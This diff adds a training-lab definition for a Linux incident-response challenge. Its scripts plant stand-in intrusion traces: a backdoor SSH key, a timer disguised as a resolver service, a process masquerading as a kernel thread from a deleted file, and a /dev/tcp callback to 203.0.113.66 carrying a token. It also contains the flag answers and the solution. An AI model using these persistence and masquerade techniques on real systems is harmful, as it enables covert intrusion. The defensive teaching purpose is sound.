@@ -1,0 +1,201 @@
+schema_version = 1
+id = "labs.linux-challenge-night-visitor"
+target = "linux"
+distro = "ubuntu"
+network = "isolated"
+title = "Challenge: the night visitor"
+summary = "Investigate an intrusion on a small intranet server: find five flags in the traces, then contain it without breaking the site."
+lesson = "security.incident-response-linux"
+symptom = '''
+Someone got into this server one night. The intranet team saw odd entries from that night in their web log, /var/log/winlab-intranet/access.log.
+
+1. Investigate. Five flags, each looking like WL{...}, are in the traces the intruder left. Most are encoded. Hand each one in as you find it.
+2. Contain the intrusion: nothing of the intruder's may keep running or start again, their way back in must be closed, and the intranet site (winlab-intranet) must keep working. Then press Check.
+
+Collect before you remove: stopping or deleting things can destroy evidence. (Reset brings it all back, with the same flags.)
+Sign-ins by labadmin from 10.0.2.2 in the system logs are WinLab itself setting up and checking this lab. They are not part of the incident.
+Everything planted here is a harmless stand-in made by this lab.
+'''
+hints = [
+  "Work from the outside in: the web log says who came and what they sent. List the addresses (awk '{print $1}' FILE | sort | uniq -c): one does not belong with the others. Read everything it did, in order. Text ending in = is often base64 (base64 -d).",
+  "Check every account, not only new ones: getent passwd shows each account's shell and home folder. Look for a system account that can suddenly log in, and in the .ssh folder under its home, wherever that is. Read the whole key line.",
+  "Something brings the intruder's program back. systemctl list-timers --all shows timers; systemctl cat NAME shows what one runs. A name that sounds like part of the system is not proof that it is. Read the script. A long run of digits and a-f may be text written in hex (python3 -c \"print(bytes.fromhex('...'))\").",
+  "A name in square brackets suggests a kernel thread, but a program can give itself any name. Real kernel threads have parent PID 2 (ps -eo pid,ppid,args) and no program file. For a process, ls -l /proc/PID/exe shows the program behind it; look for one marked (deleted). While it runs you can still copy it: cp /proc/PID/exe /root/evidence. Look at the end of the copy (tail -n 1, or grep -a).",
+  "What did the script try to send? journalctl -u NAME shows what a service printed.",
+  "Contain, do not destroy: disable and stop the timer, then end the running program. Move the intruder's key somewhere safe and give the account back a shell that refuses logins (usermod -s /usr/sbin/nologin NAME), or expire it (usermod -e 1 NAME).",
+]
+expected_changes = [
+  "Creates winlab-intranet.service (a small web server on 127.0.0.1:8080, enabled) and an invented web log for it",
+  "Plants harmless stand-ins for an intrusion: a login shell and a fake SSH key on the backup account, a timer and script posing as part of the system resolver, and a copy of sleep that runs under a false name",
+]
+hazards = ["Inside the lab VM only: the backup account gets a shell and a key nobody holds the private half of, until you contain it or reset"]
+scope = "single guest (the registered Linux training VM only)"
+privilege = "administrator"
+requires_snapshot = true
+cleanup_strategy = "snapshot-restore"
+certifications = ["comptia-linux-plus/security", "comptia-linux-plus/troubleshooting", "redhat-rhcsa/security"]
+setup = '''
+set -e
+mkdir -p /srv/winlab-intranet /var/log/winlab-intranet
+echo '<h1>Intranet</h1>' > /srv/winlab-intranet/index.html
+cat > /etc/systemd/system/winlab-intranet.service <<'UNIT'
+[Unit]
+Description=Intranet site (legitimate)
+
+[Service]
+WorkingDirectory=/srv/winlab-intranet
+ExecStart=/usr/bin/python3 -m http.server 8080 --bind 127.0.0.1
+DynamicUser=yes
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+UNIT
+systemctl daemon-reload
+systemctl enable --now winlab-intranet
+d=$(date -u -d yesterday +%d/%b/%Y)
+req() { echo "$2 - - [$d:$1 +0000] \"$3 HTTP/1.1\" $4 $5"; }
+{
+i=0
+while [ $i -lt 290 ]; do
+  case $((i % 9)) in
+    0) r="GET /"; s=200 ;; 1) r="GET /news"; s=200 ;; 2) r="GET /staff"; s=200 ;;
+    3) r="GET /search?q=holiday"; s=200 ;; 4) r="GET /favicon.ico"; s=404 ;; 5) r="POST /login"; s=302 ;;
+    6) r="GET /menu"; s=200 ;; 7) r="GET /rota"; s=200 ;; *) r="GET /styles.css"; s=304 ;;
+  esac
+  req "$(printf '%02d:%02d:%02d' $((i / 60)) $((i % 60)) $((i * 7 % 60)))" "10.20.0.$((11 + i * 7 % 23))" "$r" $s $((500 + i * 37 % 900))
+  i=$((i + 1))
+done
+n=198.51.100.23
+req 02:03:11 $n "GET /admin" 404 153
+req 02:03:12 $n "GET /phpmyadmin/" 404 153
+req 02:03:14 $n "GET /.env" 404 153
+req 02:03:19 $n "GET /login" 200 912
+for t in 02:04:02 02:04:05 02:04:09; do req $t $n "POST /login" 401 87; done
+req 02:05:40 $n "POST /login" 302 0
+req 02:07:15 $n "POST /upload?name=report.php&note={{flag_b64:access}}" 201 31
+req 02:07:31 $n "GET /uploads/report.php" 200 2
+} | sort -s -k4,4 > /var/log/winlab-intranet/access.log
+'''
+fault = '''
+set -e
+usermod -s /bin/bash backup
+install -d -m 700 -o backup -g backup /var/backups/.ssh
+echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIWLLABFAKEKEYWLLABFAKEKEYWLLABFAKEKEYAAAA {{flag_b64:account}}' > /var/backups/.ssh/authorized_keys
+chown backup:backup /var/backups/.ssh/authorized_keys; chmod 600 /var/backups/.ssh/authorized_keys
+l=/usr/local/lib/systemd-resolve-sync
+install -d -m 755 $l /var/lib/systemd-resolve-sync
+{ cat /usr/bin/sleep; printf '\nWLNOTE:%s\n' '{{flag_b64:process}}'; } | gzip > $l/cache.bin
+echo '{{flag_b64:callback}}' > /var/lib/systemd-resolve-sync/queue
+cat > $l/sync.sh <<'SH'
+#!/bin/sh
+# resolver cache sync
+id={{flag_hex:persistence}}
+p=/dev/shm/.cache-sync
+for e in /proc/[0-9]*/exe; do
+  case $(readlink "$e" 2>/dev/null) in "$p"*) exit 0 ;; esac
+done
+gzip -dc /usr/local/lib/systemd-resolve-sync/cache.bin > $p
+chmod 700 $p
+setsid bash -c 'exec -a "[kworker/u4:3-events]" /dev/shm/.cache-sync infinity' </dev/null >/dev/null 2>&1 &
+sleep 1
+rm -f $p
+timeout 3 bash -c '</dev/tcp/203.0.113.66/8080' 2>/dev/null || echo "upload to 203.0.113.66:8080 failed, still queued: token=$(cat /var/lib/systemd-resolve-sync/queue)"
+SH
+chmod 755 $l/sync.sh
+cat > /etc/systemd/system/systemd-resolve-sync.service <<'UNIT'
+[Unit]
+Description=Resolver cache synchronisation
+
+[Service]
+Type=oneshot
+ExecStart=/usr/local/lib/systemd-resolve-sync/sync.sh
+KillMode=process
+UNIT
+cat > /etc/systemd/system/systemd-resolve-sync.timer <<'UNIT'
+[Unit]
+Description=Resolver cache synchronisation
+
+[Timer]
+OnBootSec=20s
+OnUnitActiveSec=1min
+AccuracySec=1s
+
+[Install]
+WantedBy=timers.target
+UNIT
+systemctl daemon-reload
+systemctl enable --now systemd-resolve-sync.timer
+systemctl start systemd-resolve-sync.service
+sync
+'''
+solution = '''
+systemctl disable --now systemd-resolve-sync.timer
+systemctl stop systemd-resolve-sync.service
+for p in /proc/[0-9]*; do
+  case $(readlink "$p/exe" 2>/dev/null) in */.cache-sync*) kill "${p#/proc/}" ;; esac
+done
+mv /var/backups/.ssh/authorized_keys /root/backup-authorized_keys.evidence
+usermod -s /usr/sbin/nologin backup
+sleep 2
+'''
+
+[[flags]]
+name = "access"
+question = "The web log: the intruder sent something along when they uploaded a file. What did it say?"
+recover = '''
+grep 'POST /upload' /var/log/winlab-intranet/access.log | grep -o 'note=[^ ]*' | cut -d= -f2- | base64 -d
+'''
+
+[[flags]]
+name = "account"
+question = "An account that should never log in now can. What did the intruder label their way in with?"
+recover = '''
+awk '{print $NF}' /var/backups/.ssh/authorized_keys | base64 -d
+'''
+
+[[flags]]
+name = "persistence"
+question = "Something brings the intruder's program back after a reboot. What identifier is written in what it runs?"
+recover = '''
+python3 -c 'import sys; print(bytes.fromhex(sys.argv[1]).decode())' "$(sed -n 's/^id=//p' /usr/local/lib/systemd-resolve-sync/sync.sh)"
+'''
+
+[[flags]]
+name = "process"
+question = "A running program has no file on disk any more. Recover it: what note is at the end of it?"
+recover = '''
+for i in $(seq 90); do
+  for p in /proc/[0-9]*; do
+    case $(readlink "$p/exe" 2>/dev/null) in
+      */.cache-sync*) grep -a '^WLNOTE:' "$p/exe" | cut -d: -f2 | base64 -d; exit 0 ;;
+    esac
+  done
+  sleep 1
+done
+exit 1
+'''
+
+[[flags]]
+name = "callback"
+question = "The intruder's program tries to send something out, and the isolated network stops it. What was it trying to send?"
+recover = '''
+journalctl -u systemd-resolve-sync.service --no-pager | grep -o 'token=[A-Za-z0-9+/=]*' | tail -n 1 | cut -d= -f2- | base64 -d
+'''
+
+[validate]
+script = '''
+u=systemd-resolve-sync.timer
+t=off; [ "$(systemctl is-enabled $u 2>/dev/null)" = enabled ] && t=on
+a=off; systemctl is-active --quiet $u && a=on
+n=0
+for p in /proc/[0-9]*; do
+  case $(readlink "$p/exe" 2>/dev/null) in */.cache-sync*) n=$((n + 1)) ;; esac
+done
+k=gone; [ -s /var/backups/.ssh/authorized_keys ] && k=present
+login=open
+case $(getent passwd backup | cut -d: -f7) in */nologin|*/false) login=closed ;; esac
+[ "$(chage -l backup | awk -F': ' '/Account expires/ {print $2}')" = "Jan 02, 1970" ] && login=closed
+echo "timer=$t;timeractive=$a;process=$n;key=$k;login=$login;site=$(systemctl is-active winlab-intranet)"
+'''
+expect_output_contains = "timer=off;timeractive=off;process=0;key=gone;login=closed;site=active"
